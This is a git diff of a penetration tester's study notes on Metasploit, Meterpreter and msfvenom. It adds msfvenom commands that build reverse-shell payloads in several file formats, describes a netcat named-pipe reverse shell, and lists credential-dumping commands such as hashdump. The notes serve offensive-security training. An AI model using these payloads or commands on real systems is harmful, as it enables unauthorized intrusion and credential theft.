@@ -8,9 +8,14 @@ Basic Metasploit flow:
 * `set $OPTIONS`
 * `run`
 
+You can use msfconsole as a shell, but there’s no redirect functionality.
+
 ### Commands
 
+* `back` — exit the current module
 * `db_nmap $FLAGS $IP` — run nmap and dump the results into the Metasploit DB; all nmap $FLAGS are supported and Metasploit will elevate privileges if necessary
+* `help` — get metasploit help
+* `history` — display command history
 * `hosts` — display known hosts in DB
 * `hosts -d` — delete saved hosts from DB
 * `info` — show module information (including exploit target options)
@@ -18,24 +23,32 @@ Basic Metasploit flow:
 * `options` (`advanced`)— show module/exploit options (or “advanced” options)
 * `run`/`exploit` — run the selected exploit
 * `run -j` — run the selected exploit as a background job
-* `search` — search modules
+* `search` — search modules; query to a particular type of module using the `type:` parameter (e.g., `search type:exploit wordpress`)
 * `services` — display services discovered in known hosts in DB
 * `sessions` — list open Meterpreter sessions on a box
 * `sessions -i $SESSION_NUMER` — connect to Meterpreter session $SESSION_NUMBER
+* `show auxiliary` — show auxiliary modules, filtered by relevancy if called from within a module
+* `show exploits` — show exploit modules
+* `show options` — show module options
+* `show payloads` — show payload modules, filtered by relevancy if called from within a module
 * `spool` — save all console output to a log file (useful for record-keeping)
-* `vulns` — display vulnerabilities discovered in known hosts in DB
 * `use` — select a Metasploit module/exploit
+* `vulns` — display vulnerabilities discovered in known hosts in DB
+* `workspace` — use workspaces; keeps database results isolated per engagement
 
 Note that you can also call regular shell commands (`ip`, `ls`, etc.) from msfconsole. You can also background processes using Ctrl + Z (Metasploit will trap this, so you don’t have to worry about backgrounding the entire msfconsole).
 
-### Core Modules
+### Modules
 
-* EXPLOIT code;
-* Post-exploitation PAYLOADs;
-* AUXILIARY functions, such as scanning machines for vulnerabilities;
-* POST exploitation tools for “looting” and pivoting;
-* An ENCODER module for obfuscating exploits;
-* And finally a module called NOP that includes tools for exploiting buffer overflows and return-orientated programming.
+Module categories:
+
+* Auxiliary (odds-n-ends)
+* Encoders (re-encode exploits to thwart signature-based anti-malware solutions)
+* Evasion (attempt to directly evade anti-malware solutions)
+* Exploits
+* NOPS (no-op code that can be used to pad exploits to a needed size)
+* Payloads (what you want to run if the exploit is successful; often, but not always, some kind of shell)
+* Post (additional post-exploitation tools)
 
 Note that Metasploit 6 apparently calls these “framework plugins” now.
 
@@ -43,18 +56,43 @@ Note that Metasploit 6 apparently calls these “framework plugins” now.
 * ALSO REMEMBER: Be sure to set LHOST (and, when applicable, SRVHOST) correctly, even if it’s not indicated by the module. Metasploit’s guesses about which interface to use aren’t always correct… (I find using the explicit IP address works better than specifying the interface device or leaving SRVHOST at the default of 0.0.0.0.)
 * ALSO ALSO REMEMBER: Sometimes you might find yourself in the position of trying to exploit a service over an SSH tunnel (for example, if you're trying to exploit a service that's not exposed externally in order to elevate your privileges). When doing this, remember that LHOST is still your machine's external address, as the exploit won't be connecting back over the SSH tunnel (obviously)!
 
-There are also modules for basic enumeration, such as smtp_version/smtp_enum (for SMTP) and mysql_sql (for MySQL, though this seems to just be a thin wrapper around the MySQL command line client).
-
 ### Module Options
 
-Most modules support the ARCH and PAYLOAD options (for specifying target architecture and the payload to deliver). These options can also be set by directly calling a fully-specified payload (see the next section).
+The common RHOSTS option accepts IP addresses, ranges, CIDR networks, and even a file with one target per line (specify as `file:/path/to/file.txt`).
 
-### Useful Payloads
+Most modules support the ARCH, PAYLOAD, and SESSION options (for specifying target architecture, the payload to deliver, or session number to connect to). However, these are *not* shown when running `show options`.
 
-* `windows/x64/shell/reverse_tcp` — Windows reverse shell (system) over TCP
-* `windows/x64/meterpreter/reverse_tcp` — Windows reverse shell (Meterpreter) over TCP
+You can reset individual parameters using `unset`, and reset the entire module using `unset all`.
 
-Payloads follow the OS/ARCHITECTURE/PAYLOAD (though ARCHITECTURE is not included for 32-bit Windows payloads). Staged payloads replace the first `_` with a `/`, so windows/x64/shell/reverse_tcp is a staged while windows/x64/shell_revers_tcp is stageless.
+Equivalent module commands:
+
+* `set -g` = `setg`
+* `unset -g` = `unsetg`
+* `run` = `exploit`
+
+Some exploit modules have a `check` option which attempts to determine if a target is vulnerable without actually exploiting it. Alternately, other modules have a paired auxiliary scanner. Many *don’t* have a check at all. YMMV!
+
+### Scanners
+
+Use `search portscan` to display built-in Metasploit port scanners. Note that `msfconsole` needs to be run as root for many scans to work — just like Nmap. That said, in my experience the fancier TCP scans (for example, SYN) don’t work over a VPN… So maybe best to stick with Nmap.
+
+Targeted scanners can be more useful, however:
+
+* The `auxiliary/scanner/discovery/udp_sweep` module will probe for common UDP services.
+* The `auxiliary/scanner/http/http_version` module will give you HTTP server version information.
+* The `auxiliary/scanner/smb/smb_login` module will allow you to bruteforce Samba logins (username and/or password) using a wordlist(s).
+
+Metasploit has a variety of Samba/CIFS scanners too (use `search scanner/smb` to list them), as well as modules for basic enumeration such as `smtp_version`/`smtp_enum` (for SMTP) and `mysql_sql` (for MySQL, though this seems to just be a thin wrapper around the MySQL command line client).
+
+### Payloads
+
+Payloads can be divided into:
+
+* Singles (self-contained; also indicated by the use of an `_` separating “shell” from the rest of the payload name, as in `shell_reverse_tcp`)
+* Stagers (small applications that establish a connection back to the attacker to download a larger, more complex payload)
+* Stages (payloads designed to be downloaded by a stager; also indicated by the use of a `/` separating “shell” from the rest of the payload name, as in `shell/reverse_tcp`)
+
+Payloads follow the OS/ARCHITECTURE/PAYLOAD (though ARCHITECTURE is not included for 32-bit Windows payloads).
 
 NOTE: Metasploit defaults to sending 32-bit payloads, but an increasing number of things won't work on a 64-bit system from a 32-bit meterpreter shell. It's probably best to explicitly set the `payload` option to use a 64-bit payload unless you *know* that you'll be dealing with a 32-bit system.
 
@@ -79,7 +117,7 @@ The Meterpreter reverse shell *requires* a connection back to msfconsole using m
 * `getuid` — display current user ID
 * `getsystem` — attempt to elevate to (or confirm) local system privileges
 * `golden_ticket_create` — create a golden ticket (requires the `kiwi` module)
-* `hashdump` — dump all passwords in the SAM (Windows-only, requires system privileges)
+* `hashdump` — dump NTLM hashes from the SAM (Windows-only, requires system privileges); fields are username, RID (the last four digits of the Windows SID, with leading zeros dropped), LM password hash, NTLM password hash
 * `help` — help menu
 * `help $COMMAND` — help specifically for $COMMAND
 * `ipconfig`/`ifconfig` — display network information
@@ -94,6 +132,8 @@ The Meterpreter reverse shell *requires* a connection back to msfconsole using m
 * `sysinfo` — display system information
 * `timestomp` — manipulate file times
 * `upload` — transfer file from the host to the target
+
+Meterpreter sessions can be backgrounded using the `background` command, and all sessions can be backgrounded using `CTRL + Z`. List sessions using the `sessions` command, and foreground a session using `session -i #`, where `#` is the session number.
 
 I *think* that Meterpreter is being run directly from memory, and what `migrate` is doing is basically creating a new process using the memory of a different application, hopping to that process, and then shutting down the old process.
 
@@ -137,7 +177,7 @@ powershell_shell
 
 ## Venom (“msfvenom”)
 
-Use msfvenom to generate exploit payloads for inclusion outside of msfconsole. For example:
+Msfvenom is a tool to create custom versions of Metasploit payloads, encoded into a variety of different binary formats and scripts. For example:
 
 ```bash
 # Use Metasploit to generate the code for a remote shell:
@@ -165,9 +205,42 @@ What’s going on here?
 * We then spin up a netcat instance directed at our local machine (`nc $LOCAL_IP $LOCAL_PORT`), direct the contents of the pipe into netcat’s STDIN (`0< /tmp/qdsrgu`), pipe the *output* of netcat to a shell we know probably exists (`| /bin/sh`), and finally redirect *both* STDOUT and STDERR back into the named pipe (`> /tmp/qdsrgu 2>&1`).
 * On the local machine, `nc -lvp $LOCAL_PORT` listens for the incoming netcat connection from the remote. Anything we type on STDIN here gets sent to the remote and piped to /bin/sh *there*. The output of /bin/sh is then sent to the named pipe, which dumps into (the remote) netcat, which then sends the data to the local machine where it ends up on STDOUT.
 
+Use `--list formats` to see available encoding formats.
+
+```bash
+# 32-bit Linux ELF Meterpreter payload
+#
+msfvenom -p linux/x86/meterpreter/reverse_tcp \
+LHOST=$LOCAL_IP LPORT=$LOCAL_PORT -f elf > rev_shell
+
+# 32-bit Windows executable Meterpreter payload
+#
+msfvenom -p windows/meterpreter/reverse_tcp \
+LHOST=$LOCAL_IP LPORT=$LOCAL_PORT -f exe > rev_shell.exe
+
+# PHP Meterpreter payload
+#
+msfvenom -p php/meterpreter_reverse_tcp \
+LHOST=$LOCAL_IP LPORT=$LOCAL_PORT -f raw > rev_shell.php
+
+# ASP Meterpreter payload
+#
+msfvenom -p windows/meterpreter/reverse_tcp \
+LHOST=$LOCAL_IP LPORT=$LOCAL_PORT -f asp > rev_shell.asp
+
+# Python Meterpreter payload
+#
+msfvenom -p cmd/unix/reverse_python \
+LHOST=$LOCAL_IP LPORT=$LOCAL_PORT -f raw > rev_shell.py
+```
+
 ### 32-Bit Windows Programs
 
 By default, msfvenom produces 64-bit executables when using the `-f exe`. This doesn’t work, however, if you’re trying to replace a program in Program Files (x86). In this case, you’ll need to explicitly instruct msfvenom to encode a 32-bit binary using  `-e x86/shikata_ga_nai`.
+
+### Catching Shells
+
+Use the `exploit/multi/handler` module in Metasploit to catch the shells produced using Msfvenom (note that you’ll need to use `set payload` to tell Metasploit *what* it’s catching!). We can catch both regular reverse shells and Meterpreter sessions this way.
 
 ## References
 
@@ -188,8 +261,12 @@ By default, msfvenom produces 64-bit executables when using the `-f exe`. This d
 * [Kerberos](kerberos.md)
 * [Using John the Ripper](john-the-ripper.md)
 * [Using Hashcat](hashcat.md)
+* [2022-04-13 ITPro.TV: CompTIA Security+ (SY0-601) & TryHackMe: Jr. Penetration Tester](../log/2022-04-13-itprotv-comptia-security-plus-and-tryhackme-jr-penetration-tester.md)
+* [Dumping Windows Password Hashes Using Metasploit](https://www.utc.edu/sites/default/files/2021-04/4660-lab6.pdf)
+* [Windows Password Hashes](../notes/windows-password-hashes.md)
+* [2022-04-14 TryHackMe: Jr. Penetration Tester](../log/2022-04-14-tryhackme-jr-penetration-tester.md)
 
 - - - -
 
 <span aria-hidden="true">👤</span> Nathan Acks  
-<span aria-hidden="true">📅</span> October 21, 2021
+<span aria-hidden="true">📅</span> April 16, 2022
